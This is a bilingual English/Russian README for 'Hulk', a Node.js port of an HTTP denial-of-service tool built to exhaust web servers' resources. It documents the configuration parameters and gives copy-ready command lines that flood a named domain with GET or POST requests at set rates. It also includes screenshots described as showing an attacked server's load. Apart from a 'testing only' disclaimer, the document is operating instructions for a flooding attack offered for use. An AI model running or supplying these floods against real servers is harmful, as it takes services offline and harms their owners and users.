# Hulk v1.0.0
DoS Attack tools (for testing purposes only)

## EN

Quotation of the original file:
"This tool is a dos tool that is meant to put heavy load on HTTP servers in 
order to bring them to their knees by exhausting the resource pool, 
its is meant for research purposes only and any malicious usage of this tool is prohibited."
Originaly (python) author :  Barry Shteiman - http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/
	
Rewritten with python (concept) under nodejs, optimized by Siarhei Dudko

- Dependencies
  - http
  - https
  - colors
  - url
  
- Setting (editing the script)
  - set_you_link - link to you server, formated "https://test.com/"
  - set_this_data - data to request (not use for GET request)
  - set_this_method - type request (GET, POST and others)
  - set_req_total - number of requests for attack
  - set_req_in_min - limit download of requests per minute
  
- Setting (passing arguments)
  - Default values:
```
  - set_you_link - http://you_link.com/
  - set_this_data - ''
  - set_this_method - GET
  - set_req_total - 20k
  - set_req_in_min - 10k/min
```
  - With the argument set_this_data:
```
  node hulk.core.js set_you_link set_this_data set_this_method set_req_total set_req_in_min
  node hulk.core.js http://alenmoroz.tk dsdsdsds POST 100 1000
  
  - set_you_link - http://alenmoroz.tk
  - set_this_data - dsdsdsds
  - set_this_method - POST
  - set_req_total - 100
  - set_req_in_min - 1000 req/min
```
  - Without the argument set_this_data:
```
  node hulk.core.js set_you_link set_this_method set_req_total set_req_in_min
  node hulk.core.js http://alenmoroz.tk GET 1000 1000
  
  - set_you_link - http://alenmoroz.tk
  - set_this_data - ''
  - set_this_method - GET
  - set_req_total - 1000
  - set_req_in_min - 1000 req/min
```
  - Using the default settings:
```
  node hulk.core.js set_you_link set_this_method set_req_total
  node hulk.core.js http://alenmoroz.tk GET 2000
   
  - set_you_link - http://alenmoroz.tk
  - set_this_data - ''
  - set_this_method - GET
  - set_req_total - 2000
  - set_req_in_min - 10k req/min
```

## RU  

Софт для DoS атаки на сервер. Исключительно для тестирования собственных продуктов. 
Использование в противозаконных целях запрещено. Идея навеяна аналогичным скриптом на python(Barry Shteiman - http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/).
На основании её и реализовал в javascript(nodejs). Плюшки асинхронного языка в комплекте.

- Зависимости
  - http
  - https
  - colors
  - url

- Настройка (редактирование скрипта)
  - set_you_link - ссылка для атаки "https://test.com/"
  - set_this_data - данные REST запроса (могут быть пустыми)
  - set_this_method - вид запроса (GET, POST и др.)
  - set_req_total - общее число запросов к серверу
  - set_req_in_min - предел скорости запросов к серверу (запросов в минуту)
  
- Настройка (передача аргументов)
  - Значения по умолчанию:
```
  - set_you_link - http://you_link.com/
  - set_this_data - ''
  - set_this_method - GET
  - set_req_total - 20k
  - set_req_in_min - 10k/min
```
  - В случае передачи аргумента set_this_data:
```
  node hulk.core.js set_you_link set_this_data set_this_method set_req_total set_req_in_min
  node hulk.core.js http://alenmoroz.tk dsdsdsds POST 100 1000
  
  - set_you_link - http://alenmoroz.tk
  - set_this_data - dsdsdsds
  - set_this_method - POST
  - set_req_total - 100
  - set_req_in_min - 1000 req/min
```
  - Без передачи аргумента set_this_data:
```
  node hulk.core.js set_you_link set_this_method set_req_total set_req_in_min
  node hulk.core.js http://alenmoroz.tk GET 1000 1000
  
  - set_you_link - http://alenmoroz.tk
  - set_this_data - ''
  - set_this_method - GET
  - set_req_total - 1000
  - set_req_in_min - 1000 req/min
```
  - Используя параметры по умолчанию:
```
  node hulk.core.js set_you_link set_this_method set_req_total
  node hulk.core.js http://alenmoroz.tk GET 2000
   
  - set_you_link - http://alenmoroz.tk
  - set_this_data - ''
  - set_this_method - GET
  - set_req_total - 2000
  - set_req_in_min - 10k req/min
```
  
## SCREENSHOTS

- Внешний вид атаки/Appearance of attack

![Screenshot_1](https://github.com/siarheidudko/hulk/raw/master/img/Screenshot_1.png)

- Вывод итоговой статистики/Output of summary statistics

![Screenshot_2](https://github.com/siarheidudko/hulk/raw/master/img/Screenshot_2.png)

- Вот так это выглядит в CPanel атакуемого сервера (напомню, что убить сервер цели не было - потому атаки были не продолжительны)/This is how it looks in the CPanel of the attacked server (I recall that there was no goal to kill the server - therefore, the attacks were not long)

![Screenshot_3](https://github.com/siarheidudko/hulk/raw/master/img/Screenshot_3.png)

![Screenshot_4](https://github.com/siarheidudko/hulk/raw/master/img/Screenshot_4.png)

![Screenshot_5](https://github.com/siarheidudko/hulk/raw/master/img/Screenshot_5.png)

![Screenshot_6](https://github.com/siarheidudko/hulk/raw/master/img/Screenshot_6.png)